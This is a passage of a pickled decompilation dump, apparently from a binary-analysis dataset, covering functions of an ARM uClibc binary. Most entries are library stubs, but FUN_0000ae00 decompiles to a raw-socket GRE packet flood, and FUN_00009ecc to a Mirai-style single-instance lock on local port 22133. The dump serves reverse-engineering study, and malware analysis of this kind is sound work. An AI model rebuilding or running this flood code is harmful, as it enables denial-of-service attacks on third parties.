c8\n.text:0000bbcc\n.text:0000bbd0\n.text:0000bbd4\n.text:0000bbd8\n.text:0000bbdc\n.text:0000bbe0\n.text:0000bbe4\n.text:0000bbe8\n.text:0000bbec\n.text:0000bbf0\n.text:0000bbf4\n.text:0000bbf8\n.text:0000bbfc\n.text:0000bc00\n.text:0000bc04\n.text:0000bc08\n.text:0000bc0c\n.text:0000bc10\n.text:0000bc14\n.text:0000bc18\n.text:0000bc1c\n.text:0000bc20\n.text:0000bc24\n.text:0000bc28\n.text:0000bc2c\n.text:0000bc30\n'
p335
tp336
sS'__uClibc_main'
p337
(S'\n__stdcall __uClibc_main()\n'
p338
V\u000avoid __uClibc_main(void)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008b14. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00014144)();\u000a  return;\u000a}\u000a\u000a
p339
S'adr r12,0x8b14\nadd r12,r12,#0xb000\nldr pc,[r12,#0x630]!\n'
p340
S'00 c6 8f e2\n0b ca 8c e2\n30 f6 bc e5\n'
p341
S'.plt:00008b0c\n.plt:00008b10\n.plt:00008b14\n'
p342
tp343
sS'getsockopt'
p344
(S'\n__stdcall getsockopt(int __fd, int __level, int __optname, void * __optval, socklen_t * __optlen)\n'
p345
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint getsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t *__optlen)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b50. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014158)();\u000a  return iVar1;\u000a}\u000a\u000a
p346
S'adr r12,0x8b50\nadd r12,r12,#0xb000\nldr pc,[r12,#0x608]!\n'
p347
S'00 c6 8f e2\n0b ca 8c e2\n08 f6 bc e5\n'
p348
S'.plt:00008b48\n.plt:00008b4c\n.plt:00008b50\n'
p349
tp350
sS'_DT_INIT'
p351
(S'\n__stdcall _DT_INIT()\n'
p352
V\u000avoid _DT_INIT(void)\u000a\u000a{\u000a  return;\u000a}\u000a\u000a
p353
S'cpy r12,sp\nstmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 r12 lr pc}\nsub r11,r12,#0x4\nldmdb r11,{ r4 r5 r6 r7 r8 r9 r10 r11 sp pc}\n'
p354
S'0d c0 a0 e1\nf0 df 2d e9\n04 b0 4c e2\nf0 af 1b e9\n'
p355
S'.init:00008998\n.init:0000899c\n.init:000089a0\n.init:000089a4\n'
p356
tp357
sS'setsockopt'
p358
(S'\n__stdcall setsockopt(int __fd, int __level, int __optname, void * __optval, socklen_t __optlen)\n'
p359
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint setsockopt(int __fd,int __level,int __optname,void *__optval,socklen_t __optlen)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008aa8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014120)();\u000a  return iVar1;\u000a}\u000a\u000a
p360
S'adr r12,0x8aa8\nadd r12,r12,#0xb000\nldr pc,[r12,#0x678]!\n'
p361
S'00 c6 8f e2\n0b ca 8c e2\n78 f6 bc e5\n'
p362
S'.plt:00008aa0\n.plt:00008aa4\n.plt:00008aa8\n'
p363
tp364
sS'ioctl'
p365
(S'\n__stdcall ioctl(int __fd, ulong __request)\n'
p366
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint ioctl(int __fd,ulong __request,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089d0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000140d8)();\u000a  return iVar1;\u000a}\u000a\u000a
p367
S'adr r12,0x89d0\nadd r12,r12,#0xb000\nldr pc,[r12,#0x708]!\n'
p368
S'00 c6 8f e2\n0b ca 8c e2\n08 f7 bc e5\n'
p369
S'.plt:000089c8\n.plt:000089cc\n.plt:000089d0\n'
p370
tp371
sS'strcat'
p372
(S'\n__stdcall strcat(char * __dest, char * __src)\n'
p373
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strcat(char *__dest,char *__src)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a84. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_00014114)();\u000a  return pcVar1;\u000a}\u000a\u000a
p374
S'adr r12,0x8a84\nadd r12,r12,#0xb000\nldr pc,[r12,#0x690]!\n'
p375
S'00 c6 8f e2\n0b ca 8c e2\n90 f6 bc e5\n'
p376
S'.plt:00008a7c\n.plt:00008a80\n.plt:00008a84\n'
p377
tp378
sS'sleep'
p379
(S'\n__stdcall sleep(uint __seconds)\n'
p380
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000auint sleep(uint __seconds)\u000a\u000a{\u000a  uint uVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a24. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  uVar1 = (*(code *)PTR_LAB_000140f4)();\u000a  return uVar1;\u000a}\u000a\u000a
p381
S'adr r12,0x8a24\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6d0]!\n'
p382
S'00 c6 8f e2\n0b ca 8c e2\nd0 f6 bc e5\n'
p383
S'.plt:00008a1c\n.plt:00008a20\n.plt:00008a24\n'
p384
tp385
sS'FUN_00009ecc'
p386
(S'\n__stdcall FUN_00009ecc()\n'
p387
V\u000avoid FUN_00009ecc(void)\u000a\u000a{\u000a  uint uVar1;\u000a  int *piVar2;\u000a  int iVar3;\u000a  uint32_t local_2c;\u000a  undefined4 local_28;\u000a  sa_family_t local_24;\u000a  uint16_t local_22;\u000a  uint32_t local_20;\u000a  int local_14;\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0x9ed8;\u000a  local_28 = 1;\u000a  local_14 = socket(2,1,0);\u000a  if (local_14 != -1) {\u000a    setsockopt(local_14,1,2,&local_28,4);\u000a    uVar1 = fcntl(local_14,3,0);\u000a    fcntl(local_14,4,uVar1 | 0x800);\u000a    local_24 = 2;\u000a    if (*PTR_DAT_0000a06c == 0) {\u000a      local_2c = *(uint32_t *)PTR_DAT_0000a070;\u000a    }\u000a    else {\u000a      local_2c = htonl(0x7f000001);\u000a    }\u000a    local_20 = local_2c;\u000a    local_22 = htons(0x5675);\u000a    piVar2 = __errno_location();\u000a    *piVar2 = 0;\u000a    iVar3 = bind(local_14,(sockaddr *)&local_24,0x10);\u000a    if (iVar3 == -1) {\u000a      piVar2 = __errno_location();\u000a      if ((*piVar2 == 99) && (*PTR_DAT_0000a06c != 0)) {\u000a        *PTR_DAT_0000a06c = 0;\u000a      }\u000a      local_24 = 2;\u000a      local_20 = 0;\u000a      local_22 = htons(0x5675);\u000a      connect(local_14,(sockaddr *)&local_24,0x10);\u000a      sleep(5);\u000a      close(local_14);\u000a      FUN_00009ecc();\u000a    }\u000a    else {\u000a      listen(local_14,1);\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p388
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x28\nmov r3,#0x1\nstr r3,[r11,#-0x24]\nmov r0,#0x2\nmov r1,#0x1\nmov r2,#0x0\nbl 0x00008a28\ncpy r3,r0\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\ncmn r3,#0x1\nbeq 0x0000a060\nsub r12,r11,#0x24\nmov r3,#0x4\nstr r3,[sp,#0x0]\nldr r0,[r11,#-0x10]\nmov r1,#0x1\nmov r2,#0x2\ncpy r3,r12\nbl 0x00008aa0\nldr r0,[r11,#-0x10]\nmov r1,#0x3\nmov r2,#0x0\nbl 0x00008bc0\ncpy r3,r0\norr r3,r3,#0x800\nldr r0,[r11,#-0x10]\nmov r1,#0x4\ncpy r2,r3\nbl 0x00008bc0\nmov r3,#0x2\nstrh r3,[r11,#-0x20]\nldr r3,[0xa06c]\nldrb r3,[r3,#0x0]\ncmp r3,#0x0\nbeq 0x00009f7c\nmov r0,#0x7f000000\nadd r0,r0,#0x1\nbl 0x00008ad0\nstr r0,[r11,#-0x28]\nb 0x00009f88\nldr r3,[0xa070]\nldr r3,[r3,#0x0]\nstr r3,[r11,#-0x28]\nldr r3,[r11,#-0x28]\nstr r3,[r11,#-0x1c]\nmov r0,#0x5600\nadd r0,r0,#0x75\nbl 0x00008b54\ncpy r3,r0\nstrh r3,[r11,#-0x1e]\nbl 0x00008b60\ncpy r2,r0\nmov r3,#0x0\nstr r3,[r2,#0x0]\nsub r3,r11,#0x20\nldr r0,[r11,#-0x10]\ncpy r1,r3\nmov r2,#0x10\nbl 0x00008a88\ncpy r3,r0\ncmn r3,#0x1\nbne 0x0000a054\nbl 0x00008b60\ncpy r3,r0\nldr r3,[r3,#0x0]\ncmp r3,#0x63\nbne 0x0000a004\nldr r3,[0xa06c]\nldrb r3,[r3,#0x0]\ncmp r3,#0x0\nbeq 0x0000a004\nldr r3,[0xa06c]\nmov r2,#0x0\nstrb r2,[r3,#0x0]\nmov r3,#0x2\nstrh r3,[r11,#-0x20]\nmov r3,#0x0\nstr r3,[r11,#-0x1c]\nmov r0,#0x5600\nadd r0,r0,#0x75\nbl 0x00008b54\ncpy r3,r0\nstrh r3,[r11,#-0x1e]\nsub r3,r11,#0x20\nldr r0,[r11,#-0x10]\ncpy r1,r3\nmov r2,#0x10\nbl 0x000089d4\nmov r0,#0x5\nbl 0x00008a1c\nldr r0,[r11,#-0x10]\nbl 0x00008bcc\nbl 0x00009ecc\nb 0x0000a060\nldr r0,[r11,#-0x10]\nmov r1,#0x1\nbl 0x00008af4\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p389
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n28 d0 4d e2\n01 30 a0 e3\n24 30 0b e5\n02 00 a0 e3\n01 10 a0 e3\n00 20 a0 e3\ncc fa ff eb\n00 30 a0 e1\n10 30 0b e5\n10 30 1b e5\n01 00 73 e3\n55 00 00 0a\n24 c0 4b e2\n04 30 a0 e3\n00 30 8d e5\n10 00 1b e5\n01 10 a0 e3\n02 20 a0 e3\n0c 30 a0 e1\ndd fa ff eb\n10 00 1b e5\n03 10 a0 e3\n00 20 a0 e3\n21 fb ff eb\n00 30 a0 e1\n02 3b 83 e3\n10 00 1b e5\n04 10 a0 e3\n03 20 a0 e1\n1b fb ff eb\n02 30 a0 e3\nb0 32 4b e1\n0c 31 9f e5\n00 30 d3 e5\n00 00 53 e3\n04 00 00 0a\n7f 04 a0 e3\n01 00 80 e2\nd6 fa ff eb\n28 00 0b e5\n02 00 00 ea\nec 30 9f e5\n00 30 93 e5\n28 30 0b e5\n28 30 1b e5\n1c 30 0b e5\n56 0c a0 e3\n75 00 80 e2\ned fa ff eb\n00 30 a0 e1\nbe 31 4b e1\ned fa ff eb\n00 20 a0 e1\n00 30 a0 e3\n00 30 82 e5\n20 30 4b e2\n10 00 1b e5\n03 10 a0 e1\n10 20 a0 e3\naf fa ff eb\n00 30 a0 e1\n01 00 73 e3\n1f 00 00 1a\ne1 fa ff eb\n00 30 a0 e1\n00 30 93 e5\n63 00 53 e3\n06 00 00 1a\n7c 30 9f e5\n00 30 d3 e5\n00 00 53 e3\n02 00 00 0a\n6c 30 9f e5\n00 20 a0 e3\n00 20 c3 e5\n02 30 a0 e3\nb0 32 4b e1\n00 30 a0 e3\n1c 30 0b e5\n56 0c a0 e3\n75 00 80 e2\ncc fa ff eb\n00 30 a0 e1\nbe 31 4b e1\n20 30 4b e2\n10 00 1b e5\n03 10 a0 e1\n10 20 a0 e3\n65 fa ff eb\n05 00 a0 e3\n75 fa ff eb\n10 00 1b e5\ndf fa ff eb\n9e ff ff eb\n02 00 00 ea\n10 00 1b e5\n01 10 a0 e3\na4 fa ff eb\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p390
S'.text:00009ecc\n.text:00009ed0\n.text:00009ed4\n.text:00009ed8\n.text:00009edc\n.text:00009ee0\n.text:00009ee4\n.text:00009ee8\n.text:00009eec\n.text:00009ef0\n.text:00009ef4\n.text:00009ef8\n.text:00009efc\n.text:00009f00\n.text:00009f04\n.text:00009f08\n.text:00009f0c\n.text:00009f10\n.text:00009f14\n.text:00009f18\n.text:00009f1c\n.text:00009f20\n.text:00009f24\n.text:00009f28\n.text:00009f2c\n.text:00009f30\n.text:00009f34\n.text:00009f38\n.text:00009f3c\n.text:00009f40\n.text:00009f44\n.text:00009f48\n.text:00009f4c\n.text:00009f50\n.text:00009f54\n.text:00009f58\n.text:00009f5c\n.text:00009f60\n.text:00009f64\n.text:00009f68\n.text:00009f6c\n.text:00009f70\n.text:00009f74\n.text:00009f78\n.text:00009f7c\n.text:00009f80\n.text:00009f84\n.text:00009f88\n.text:00009f8c\n.text:00009f90\n.text:00009f94\n.text:00009f98\n.text:00009f9c\n.text:00009fa0\n.text:00009fa4\n.text:00009fa8\n.text:00009fac\n.text:00009fb0\n.text:00009fb4\n.text:00009fb8\n.text:00009fbc\n.text:00009fc0\n.text:00009fc4\n.text:00009fc8\n.text:00009fcc\n.text:00009fd0\n.text:00009fd4\n.text:00009fd8\n.text:00009fdc\n.text:00009fe0\n.text:00009fe4\n.text:00009fe8\n.text:00009fec\n.text:00009ff0\n.text:00009ff4\n.text:00009ff8\n.text:00009ffc\n.text:0000a000\n.text:0000a004\n.text:0000a008\n.text:0000a00c\n.text:0000a010\n.text:0000a014\n.text:0000a018\n.text:0000a01c\n.text:0000a020\n.text:0000a024\n.text:0000a028\n.text:0000a02c\n.text:0000a030\n.text:0000a034\n.text:0000a038\n.text:0000a03c\n.text:0000a040\n.text:0000a044\n.text:0000a048\n.text:0000a04c\n.text:0000a050\n.text:0000a054\n.text:0000a058\n.text:0000a05c\n.text:0000a060\n.text:0000a064\n.text:0000a068\n'
p391
tp392
sS'FUN_0000bd50'
p393
(S'\n__stdcall FUN_0000bd50()\n'
p394
V\u000avoid FUN_0000bd50(void)\u000a\u000a{\u000a  raise(8);\u000a  return;\u000a}\u000a\u000a
p395
S'stmdb sp!,{ r1 lr }\nmov r0,#0x8\nbl 0x00008bd8\nldmia sp!,{ r1 lr }\nbx lr\n'
p396
S'02 40 2d e9\n08 00 a0 e3\n9e f3 ff eb\n02 40 bd e8\n1e ff 2f e1\n'
p397
S'.text:0000bd50\n.text:0000bd54\n.text:0000bd58\n.text:0000bd5c\n.text:0000bd60\n'
p398
tp399
sS'close'
p400
(S'\n__stdcall close(int __fd)\n'
p401
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint close(int __fd)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008bd4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014184)();\u000a  return iVar1;\u000a}\u000a\u000a
p402
S'adr r12,0x8bd4\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5b0]!\n'
p403
S'00 c6 8f e2\n0b ca 8c e2\nb0 f5 bc e5\n'
p404
S'.plt:00008bcc\n.plt:00008bd0\n.plt:00008bd4\n'
p405
tp406
sS'connect'
p407
(S'\n__stdcall connect(int __fd, sockaddr * __addr, socklen_t __len)\n'
p408
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint connect(int __fd,sockaddr *__addr,socklen_t __len)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089dc. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000140dc)();\u000a  return iVar1;\u000a}\u000a\u000a
p409
S'adr r12,0x89dc\nadd r12,r12,#0xb000\nldr pc,[r12,#0x700]!\n'
p410
S'00 c6 8f e2\n0b ca 8c e2\n00 f7 bc e5\n'
p411
S'.plt:000089d4\n.plt:000089d8\n.plt:000089dc\n'
p412
tp413
sS'atoi'
p414
(S'\n__stdcall atoi(char * __nptr)\n'
p415
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint atoi(char *__nptr)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b80. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014168)();\u000a  return iVar1;\u000a}\u000a\u000a
p416
S'adr r12,0x8b80\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5e8]!\n'
p417
S'00 c6 8f e2\n0b ca 8c e2\ne8 f5 bc e5\n'
p418
S'.plt:00008b78\n.plt:00008b7c\n.plt:00008b80\n'
p419
tp420
sS'malloc'
p421
(S'\n__stdcall malloc(size_t __size)\n'
p422
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * malloc(size_t __size)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a18. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_000140f0)();\u000a  return pvVar1;\u000a}\u000a\u000a
p423
S'adr r12,0x8a18\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6d8]!\n'
p424
S'00 c6 8f e2\n0b ca 8c e2\nd8 f6 bc e5\n'
p425
S'.plt:00008a10\n.plt:00008a14\n.plt:00008a18\n'
p426
tp427
sS'FUN_0000bd38'
p428
(S'\n__stdcall FUN_0000bd38()\n'
p429
V\u000avoid FUN_0000bd38(void)\u000a\u000a{\u000a  FUN_0000bc3c();\u000a  return;\u000a}\u000a\u000a
p430
S'stmdb sp!,{ r0 r1 lr }\nbl 0x0000bc3c\nldmia sp!,{ r1 r2 lr }\nmul r3,r2,r0\nsub r1,r1,r3\nbx lr\n'
p431
S'03 40 2d e9\nbe ff ff eb\n06 40 bd e8\n92 00 03 e0\n03 10 41 e0\n1e ff 2f e1\n'
p432
S'.text:0000bd38\n.text:0000bd3c\n.text:0000bd40\n.text:0000bd44\n.text:0000bd48\n.text:0000bd4c\n'
p433
tp434
sS'FUN_0000ae00'
p435
(S'\n__stdcall FUN_0000ae00()\n'
p436
V\u000avoid FUN_0000ae00(undefined4 uParm1,undefined4 uParm2,int iParm3,uint uParm4)\u000a\u000a{\u000a  int iVar1;\u000a  uint16_t uVar2;\u000a  undefined2 uVar3;\u000a  undefined4 uVar4;\u000a  time_t tVar5;\u000a  sockaddr *psStack128;\u000a  socklen_t sStack124;\u000a  byte local_78 [8];\u000a  byte local_70;\u000a  byte local_68;\u000a  undefined auStack100 [4];\u000a  byte local_60 [12];\u000a  byte *local_54;\u000a  uint local_50;\u000a  int local_4c;\u000a  undefined4 local_48;\u000a  undefined4 local_44;\u000a  undefined2 local_3c;\u000a  uint16_t local_3a;\u000a  in_addr_t local_38;\u000a  byte *local_2c;\u000a  byte *local_28;\u000a  undefined *local_24;\u000a  byte *local_20;\u000a  int *local_1c;\u000a  int local_18;\u000a  time_t local_14;\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0xae0c;\u000a  local_50 = uParm4;\u000a  local_4c = iParm3;\u000a  local_48 = uParm2;\u000a  local_44 = uParm1;\u000a  local_18 = socket(2,3,6);\u000a  iVar1 = -(local_50 + 0x2e & 0xfffffff8);\u000a  local_54 = local_78 + iVar1;\u000a  local_24 = auStack100 + iVar1;\u000a  local_20 = local_60 + iVar1;\u000a  local_1c = (int *)((int)&local_4c + iVar1);\u000a  local_60[0] = *local_54 & 0x4f | 0x40;\u000a  *local_54 = local_60[0];\u000a  local_68 = *local_54 & 0xf5 | 5;\u000a  *local_54 = local_68;\u000a  local_78[iVar1 + 1] = 0;\u000a  local_2c = local_54;\u000a  local_28 = local_54;\u000a  uVar2 = htons((short)(((local_50 & 0xffff) + 0x34) * 0x10000 >> 0x10),\u000a                *(undefined *)((int)&psStack128 + iVar1));\u000a  *(uint16_t *)(local_28 + 2) = uVar2;\u000a  uVar3 = FUN_0000b2a4();\u000a  *(undefined2 *)(local_28 + 4) = uVar3;\u000a  local_28[8] = 0xff;\u000a  local_28[9] = 0x2f;\u000a  *(undefined4 *)(local_28 + 0xc) = *(undefined4 *)PTR_DAT_0000b20c;\u000a  *(in_addr_t *)(local_28 + 0x10) = local_38;\u000a  uVar2 = htons(0x800,*(undefined *)((int)&psStack128 + iVar1));\u000a  *(uint16_t *)(local_24 + 2) = uVar2;\u000a  local_70 = *local_20 & 0x4f | 0x40;\u000a  *local_20 = local_70;\u000a  local_78[0] = *local_20 & 0xf5 | 5;\u000a  *local_20 = local_78[0];\u000a  local_20[1] = 0;\u000a  uVar2 = htons((short)(((local_50 & 0xffff) + 0x1c) * 0x10000 >> 0x10),\u000a                *(undefined *)((int)&psStack128 + iVar1));\u000a  *(uint16_t *)(local_20 + 2) = uVar2;\u000a  uVar3 = FUN_0000b2a4();\u000a  *(undefined2 *)(local_20 + 4) = uVar3;\u000a  local_20[8] = 0xff;\u000a  local_20[9] = 0x11;\u000a  uVar4 = FUN_0000b2a4();\u000a  *(undefined4 *)(local_20 + 0xc) = uVar4;\u000a  *(uint *)(local_20 + 0x10) = ~(*(int *)(local_20 + 0xc) - 0x400U);\u000a  uVar3 = FUN_0000b2a4();\u000a  *(undefined2 *)local_1c = uVar3;\u000a  uVar2 = htons((short)local_48,*(undefined *)((int)&psStack128 + iVar1));\u000a  *(uint16_t *)((int)local_1c + 2) = uVar2;\u000a  uVar2 = htons((short)(((local_50 & 0xffff) + 8) * 0x10000 >> 0x10),\u000a                *(undefined *)((int)&psStack128 + iVar1));\u000a  *(uint16_t *)(local_1c + 1) = uVar2;\u000a  local_14 = time(0,*(undefined *)((int)&psStack128 + iVar1));\u000a  do {\u000a    *(undefined2 *)(local_28 + 10) = 0;\u000a    uVar3 = FUN_00008ccc(local_28,0x14);\u000a    *(undefined2 *)(local_28 + 10) = uVar3;\u000a    *(undefined2 *)(local_20 + 10) = 0;\u000a    uVar3 = FUN_00008ccc(local_20,0x14);\u000a    *(undefined2 *)(local_20 + 10) = uVar3;\u000a    *(undefined2 *)((int)local_1c + 6) = 0;\u000a    uVar3 = FUN_00008da4(local_20,local_1c,(uint)*(ushort *)(local_1c + 1),local_50 + 8);\u000a    *(undefined2 *)((int)local_1c + 6) = uVar3;\u000a    local_3c = 2;\u000a    local_3a = htons((short)local_48,*(undefined *)((int)&psStack128 + iVar1));\u000a    local_38 = inet_addr(local_44,*(undefined *)((int)&psStack128 + iVar1));\u000a    *(undefined2 **)((int)&psStack128 + iVar1) = &local_3c;\u000a    *(socklen_t *)((int)&sStack124 + iVar1) = 0x10;\u000a    sendto(local_18,local_2c,local_50 + 0x34,0x4000,*(sockaddr **)((int)&psStack128 + iVar1),\u000a           *(socklen_t *)((int)&sStack124 + iVar1));\u000a    tVar5 = time(0,*(undefined *)((int)&psStack128 + iVar1));\u000a  } while (tVar5 < local_14 + local_4c);\u000a  close(local_18,*(undefined *)((int)&psStack128 + iVar1));\u000a                    /* WARNING: Subroutine does not return */\u000a  exit(0,*(undefined *)((int)&psStack128 + iVar1));\u000a}\u000a\u000a
p437
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x70\nstr r0,[r11,#-0x40]\nstr r1,[r11,#-0x44]\nstr r2,[r11,#-0x48]\nstr r3,[r11,#-0x4c]\nmov r0,#0x2\nmov r1,#0x3\nmov r2,#0x6\nbl 0x00008a28\ncpy r3,r0\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x4c]\nadd r3,r3,#0x20\nadd r3,r3,#0x7\nadd r3,r3,#0x7\nmov r3,r3, lsr #0x3\nmov r3,r3, lsl #0x3\nrsb sp,r3,sp\nadd r1,sp,#0x8\nstr r1,[r11,#-0x50]\nldr r2,[r11,#-0x50]\nadd r3,r2,#0x7\nmov r3,r3, lsr #0x3\nmov r3,r3, lsl #0x3\nstr r3,[r11,#-0x50]\nldr r3,[r11,#-0x50]\nstr r3,[r11,#-0x28]\nldr r3,[r11,#-0x28]\nstr r3,[r11,#-0x24]\nldr r3,[r11,#-0x24]\nadd r3,r3,#0x14\nstr r3,[r11,#-0x20]\nldr r3,[r11,#-0x20]\nadd r3,r3,#0x4\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\nadd r3,r3,#0x14\nstr r3,[r11,#-0x18]\nldr r2,[r11,#-0x24]\nldrb r1,[r2,#0x0]\nstrb r1,[r11,#-0x5c]\nldrb r1,[r11,#-0x5c]\nbic r3,r1,#0xb0\norr r3,r3,#0x40\nstrb r3,[r11,#-0x5c]\nldrb r3,[r11,#-0x5c]\nstrb r3,[r2,#0x0]\nldr r2,[r11,#-0x24]\nldrb r1,[r2,#0x0]\nstrb r1,[r11,#-0x64]\nldrb r1,[r11,#-0x64]\nbic r3,r1,#0xa\norr r3,r3,#0x5\nstrb r3,[r11,#-0x64]\nldrb r3,[r11,#-0x64]\nstrb r3,[r2,#0x0]\nldr r2,[r11,#-0x24]\nmov r3,#0x0\nstrb r3,[r2,#0x1]\nldr r3,[r11,#-0x4c]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nadd r3,r3,#0x34\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x24]\nstrh r2,[r3,#0x2]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x24]\nstrh r2,[r3,#0x4]\nldr r2,[r11,#-0x24]\nmvn r3,#0x0\nstrb r3,[r2,#0x8]\nldr r2,[r11,#-0x24]\nmov r3,#0x2f\nstrb r3,[r2,#0x9]\nldr r3,[0xb20c]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x24]\nstr r2,[r3,#0xc]\nldr r2,[r11,#-0x34]\nldr r3,[r11,#-0x24]\nstr r2,[r3,#0x10]\nmov r0,#0x800\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x20]\nstrh r2,[r3,#0x2]\nldr r2,[r11,#-0x1c]\nldrb r1,[r2,#0x0]\nstrb r1,[r11,#-0x6c]\nldrb r1,[r11,#-0x6c]\nbic r3,r1,#0xb0\norr r3,r3,#0x40\nstrb r3,[r11,#-0x6c]\nldrb r3,[r11,#-0x6c]\nstrb r3,[r2,#0x0]\nldr r2,[r11,#-0x1c]\nldrb r1,[r2,#0x0]\nstrb r1,[r11,#-0x74]\nldrb r1,[r11,#-0x74]\nbic r3,r1,#0xa\norr r3,r3,#0x5\nstrb r3,[r11,#-0x74]\nldrb r3,[r11,#-0x74]\nstrb r3,[r2,#0x0]\nldr r2,[r11,#-0x1c]\nmov r3,#0x0\nstrb r3,[r2,#0x1]\nldr r3,[r11,#-0x4c]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nadd r3,r3,#0x1c\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x1c]\nstrh r2,[r3,#0x2]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x1c]\nstrh r2,[r3,#0x4]\nldr r2,[r11,#-0x1c]\nmvn r3,#0x0\nstrb r3,[r2,#0x8]\nldr r2,[r11,#-0x1c]\nmov r3,#0x11\nstrb r3,[r2,#0x9]\nbl 0x0000b2a4\ncpy r2,r0\nldr r3,[r11,#-0x1c]\nstr r2,[r3,#0xc]\nldr r3,[r11,#-0x1c]\nldr r3,[r3,#0xc]\nsub r3,r3,#0x400\nmvn r2,r3\nldr r3,[r11,#-0x1c]\nstr r2,[r3,#0x10]\nbl 0x0000b2a4\ncpy r3,r0\nmov r3,r3, lsl #0x10\nmov r2,r3, lsr #0x10\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0x0]\nldr r3,[r11,#-0x44]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0x2]\nldr r3,[r11,#-0x4c]\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\nadd r3,r3,#0x8\nmov r3,r3, lsl #0x10\nmov r3,r3, lsr #0x10\ncpy r0,r3\nbl 0x00008b54\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x18]\nstrh r2,[r3,#0x4]\nmov r0,#0x0\nbl 0x00008b30\ncpy r3,r0\nstr r3,[r11,#-0x10]\nldr r2,[r11,#-0x24]\nmov r3,#0x0\nstrh r3,[r2,#0xa]\nldr r3,[r11,#-0x24]\ncpy r0,r3\nmov r1,#0x14\nbl 0x00008ccc\ncpy r3,r0\ncpy r2,r3\nldr r3,[r11,#-0x24]\nstrh r2,[r3,#0xa]\nldr r2,[r11,#-0x1c]\nmov r3,#0x0\nstrh r3,[r2,#0xa]\nldr r3,[r11,#-0x1c]\ncpy r0,r3\nmov r1,#0x14\nbl 0x00008ccc\ncpy r3,r0\ncpy r2,r3\nldr 